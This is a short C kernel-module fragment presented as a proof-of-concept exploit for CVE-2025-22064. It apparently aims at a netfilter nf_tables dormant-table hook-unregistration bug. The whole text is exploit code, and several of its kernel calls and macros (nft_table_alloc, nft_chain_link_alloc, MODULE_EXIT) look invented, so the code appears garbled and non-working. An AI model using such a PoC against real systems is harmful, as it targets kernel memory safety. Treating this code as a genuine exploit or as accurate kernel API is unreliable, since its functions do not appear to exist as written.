MODULE_DESCRIPTION("Proof-of-Concept for CVE-2025-22064");

static struct nft_table *table;
static struct nft_hook_ops hook;
static struct nft_chain_link *link;

static int init(void) {
    /* Create a new nf_table */
    table = nft_table_alloc("test", NFT_INET_PROTO_IPV4, 0, NULL);

    /* Register a hook with the created nf_table */
    link = nft_chain_link_alloc();
    hook.hook = nf_hook_target_noflow;
    hook.hookfunc = nf_noflow_hook;
    hook.owner = THIS_MODULE;
    hook.priority = NF_IP_PRI_FIRST + 1;

    nft_chain_link_set_hook(&link->lnext, &hook);
    nft_table_chain_link_insert(table, &link->lnext);

    /* Wait for some time (to make the table dormant) */
    ktime_get();
    msleep(1000);

    /* Unregister the hook */
    // TODO: The unregisteration doesn't happen here because the table is dormant
    nft_table_chain_link_delete(table, &link->lnext);
    nft_chain_link_put(link);

    return 0;
}

static void exit(void) {
    nft_table_put(table);
    MODULE_EXIT;
}

module_init(init);
module_exit(exit);
```

